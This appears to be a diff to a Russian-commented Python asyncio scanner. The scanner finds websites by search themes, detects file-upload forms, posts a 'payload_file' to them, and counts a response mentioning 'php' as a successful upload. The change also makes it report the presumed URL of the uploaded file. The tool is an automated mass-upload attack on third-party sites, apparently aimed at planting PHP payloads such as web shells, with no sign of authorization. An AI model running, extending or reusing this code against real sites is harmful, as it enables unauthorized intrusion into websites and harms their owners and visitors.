@@ -31,7 +31,7 @@ themes = [
     "technology upload",          # Технологические сайты
     "education upload",           # Образовательные ресурсы
     "image upload",               # Сайты для загрузки изображений
-    "community upload",           # Сайты сообщество
+    "community upload",           # Сайты сообщества
     "discussion upload"           # Обсуждения и форумы
 ]
 
@@ -67,11 +67,12 @@ async def scan_for_file_upload(session, url):
                     action_url = form.get('action')
                     full_action_url = urljoin(url, action_url) if action_url else url
                     print(f"Найдена форма с загрузкой файлов на странице: {url}")
-                    result = await try_upload_file(session, full_action_url, payload_file)
+                    result, file_url = await try_upload_file(session, full_action_url, payload_file)
                     if result == "ДА":
                         print(f"{url} - {GREEN}ЗАГРУЖЕН ФАЙЛ: {result}{RESET}")
+                        print(f"Доступ к файлу: {file_url}")
                     else:
-                        print(f"{url} - {RED}ЗАГРУЖЕН ФАЙЛ: {result}{RESET}")
+                        print(f"{url} - {RED}Ошибка при загрузке файла: {result}{RESET}")
                     return  # Если файл загружен, можно прекратить обработку этой формы.
 
     except Exception as e:
@@ -88,14 +89,19 @@ async def try_upload_file(session, action_url, payload_file):
                 async with upload_session.post(action_url, data=files) as upload_response:
                     if upload_response.status == 200:
                         # Проверим, был ли файл успешно загружен
-                        if 'php' in await upload_response.text():
-                            return "ДА"
+                        text = await upload_response.text()
+                        if 'php' in text:
+                            # Попытаемся найти URL загруженного файла (это зависит от сайта)
+                            file_url = f"{action_url}/{payload_file}"
+                            return "ДА", file_url
                         else:
-                            return "НЕТ"
+                            return "НЕТ", ""
+                    elif upload_response.status == 405:
+                        return "Ошибка при загрузке: Метод не разрешен", ""
                     else:
-                        return f"Ошибка при загрузке: {upload_response.status}"
+                        return f"Ошибка при загрузке: {upload_response.status}", ""
     except Exception as e:
-        return f"Ошибка при загрузке на {action_url}: {str(e)}"
+        return f"Ошибка при загрузке на {action_url}: {str(e)}", ""
 
 # Основная функция для сканирования сайтов по поисковым запросам
 async def scan_sites_from_themes():
